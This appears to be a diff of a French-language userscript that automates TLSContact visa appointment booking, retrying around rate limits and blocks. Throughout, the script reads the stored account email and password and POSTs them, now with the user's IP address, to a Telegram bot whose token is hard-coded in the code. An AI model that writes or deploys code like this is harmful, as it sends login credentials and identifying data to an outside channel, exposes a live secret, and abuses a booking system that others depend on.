@@ -1,13 +1,14 @@
 // ==UserScript==
 // @name         JYCOSCRIPT RENAISSANCE V1.1
 // @namespace    http://tampermonkey.net/
-// @version      2025-01-09 14:16
+// @version      2025-01-09 14:19
 // @description  try to take over the world!
 // @author       You
 // @match        http://*/*
 // @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
 // @grant        Allah est le Créateur de toute chose, et de toute chose Il est Garant. Il détient les clefs des cieux et de la terre; et ceux qui ne croient pas aux versets d'Allah, ce sont ceux-là les perdants.
 // ==/UserScript==
+var version = "V1.1 2025-01-09 14:19";
 
 var CLP ;
 var cas1 = 15;
@@ -84,10 +85,10 @@ if((document.body.innerText).indexOf('524') > -1){ setTimeout(function(){ locati
 if((document.body.innerText).indexOf('404 - Not Found') > -1){ setTimeout(function(){ location.reload(); document.body.style.backgroundColor = "#FFA500"; }, 10000); };
 if ( (document.body.innerText).indexOf('over-freshening') > -1 ) {
 setTimeout(function(){ window.location = "https://ps.w.org/limit-login-attempts-reloaded/assets/banner-1544x500.png?rev=2954981"; }, 5e3);
-message = "TLSContact over-freshening"; ERROR(); }
+message = "TLSContact over-freshening" + "\n" +     localStorage.getItem("IP"); ERROR(); }
 else if ( (document.body.innerText).indexOf('You have been temporarily blocked') > -1 ) {
 setTimeout(function(){ window.location = "https://ps.w.org/limit-login-attempts-reloaded/assets/banner-1544x500.png?rev=2954981"; }, 6e3);
-message = "You have been temporarily blocked";
+message = "You have been temporarily blocked" + "\n" +     localStorage.getItem("IP");
 ERROR();}
 
 
@@ -168,7 +169,7 @@ localStorage.setItem("FORMS429", parseInt(localStorage.getItem("FORMS429")) + pa
                 localStorage.setItem("FORMS429", 0);
         document.getElementById("MOTIF").textContent = "votre forms statut : " + response.status + " RELOAD ";
         console.error("statut : " + response.status);
-        message = "forms statut 429 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer");
+        message = "forms statut 429 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP");
 ERROR();
         setTimeout(function () {
             window.location = "https://intfiction.org/uploads/default/optimized/2X/e/e04f0a22ef639e39ff3bffd9c319e02146c95406_2_1035x541.png";
@@ -287,7 +288,7 @@ const disconnect429 = 3;
                 localStorage.setItem("input429", 0);
         document.getElementById("MOTIF").textContent = "votre table statut : " + response.status + " blocked ";
         console.error("statut : " + response.status);
-message = "statut 429 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer");
+message = "statut 429 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP");
         ERROR();
         setTimeout(function () {
             window.location = "https://intfiction.org/uploads/default/optimized/2X/e/e04f0a22ef639e39ff3bffd9c319e02146c95406_2_1035x541.png";
@@ -300,7 +301,7 @@ let url = window.location.href;
 let newUrl = url.replace("appointment", "personal");
 console.log(newUrl);
 setTimeout(function () {   window.location.href = newUrl  },200e3);
-message = "statut 404 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer");
+message = "statut 404 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP");
         ERROR();}
 
             ////////// ESPACE 403 /////////////                     ////////// ESPACE 403 /////////////                ////////// ESPACE 403 /////////////
@@ -354,7 +355,7 @@ const disconnect403 = 3;
                 localStorage.setItem("inputi403", 0);
         document.getElementById("MOTIF").textContent = "votre table statut : " + response.status + " blocked ";
         console.error("statut : " + response.status);
-        message = "statut 403 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer");
+        message = "statut 403 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP");
         ERROR();
         setTimeout(function(){ ERROR403(); },15e3);
         setTimeout(function () {
@@ -609,7 +610,7 @@ previousIndex = randomIndex;
 const element = document.querySelector('#MOTIF');element.style.backgroundColor = 'red';
   const removedButtons = document.querySelectorAll('.tls-button-link');
 
-            const call = "Date selection" +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.error ;
+            const call = "Date selection" +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.error  + "\n" +     localStorage.getItem("IP") ;
   const xhr = new XMLHttpRequest();
   xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
   xhr.setRequestHeader('Content-Type', 'application/json');
@@ -659,7 +660,7 @@ const element = document.querySelector('#MOTIF');element.style.backgroundColor =
 
  setTimeout(function(){ location.reload(); },250e3);
 
-        const call = "Date selection" +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.error ;
+        const call = "Date selection" +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.error  + "\n" +     localStorage.getItem("IP") ;
   const xhr = new XMLHttpRequest();
   xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
   xhr.setRequestHeader('Content-Type', 'application/json');
@@ -688,7 +689,7 @@ if (result.message === "book appointment success") {
 
     localStorage.setItem("SUCCESS", 1);
 
-        const call = "Date selection" +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.message ;
+        const call = "Date selection" +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.message  + "\n" +     localStorage.getItem("IP") ;
   const xhr = new XMLHttpRequest();
   xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
   xhr.setRequestHeader('Content-Type', 'application/json');
@@ -1413,13 +1414,15 @@ const newElement = Object.assign(document.createElement('div'), {
     textContent: "",
     id: "MOTIFO"
 });
-//document.body.appendChild(newElement);
+document.body.appendChild(newElement);
 if ( document.querySelectorAll('.tls-popup').length > 0 ) {  document.querySelector('.tls-button-primary.-uppercase').click(); clearInterval(auto_refresh);   }
 
  }, 1000);
 }
 
 if ( window.location.pathname.split("/")[1] == "appointment" ) {
+
+            document.getElementById("MOTIF").textContent = "Appointement has been sent Successfuly";
 
         const intervalId = setInterval(function () {
         var element = document.querySelectorAll(".tls-simple-text-banner, .tls-news-banner, .tls-footer, .vld-overlay.is-active.is-full-page, .tls-simple-banner-small, .tls-status-card-info.small-card.tls-padding-bottom-no");
@@ -1961,7 +1964,7 @@ const hours = now.getUTCHours();
 const minutes = now.getUTCMinutes();
 const seconds = now.getUTCSeconds();
 
-    const call = "Firebase Date selection " +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + + "\n" + button.innerText + "\nSataus : " + response.status + "\n- TIMER : " +  hours + " : " + minutes + " : " + seconds + "\n" ;
+    const call = "Firebase Date selection " +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + + "\n" + button.innerText + "\nSataus : " + response.status + "\n- TIMER : " +  hours + " : " + minutes + " : " + seconds  + "\n" +     localStorage.getItem("IP") ;
   const xhr = new XMLHttpRequest();
   xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
   xhr.setRequestHeader('Content-Type', 'application/json');
@@ -2020,7 +2023,7 @@ previousIndex = randomIndex;
 const element = document.querySelector('#MOTIF');element.style.backgroundColor = 'red';
   const removedButtons = document.querySelectorAll('.tls-button-link');
 
-        const call = " FireDate selection" +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.error ;
+        const call = " FireDate selection" +  "\n"  + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) +  "\n" + button.innerText + "\nSataus : " + response.status + "\nERROR : " + result.error  + "\n" +     localStorage.getItem("IP") ;
   const xhr = new XMLHttpRequest();
   xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
   xhr.setRequestHeader('Content-Type', 'application/json');
@@ -2270,6 +2273,7 @@ fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => {
     const ipAddress = data.ip;
+    localStorage.setItem("IP" , ipAddress);
        if ( window.location.pathname.split("/")[1] == 'personal' ) {
     console.log('Your IP address is: ' + ipAddress); setTimeout(function(){ document.title = ipAddress + " " + 'personal' }, 10000);
 }
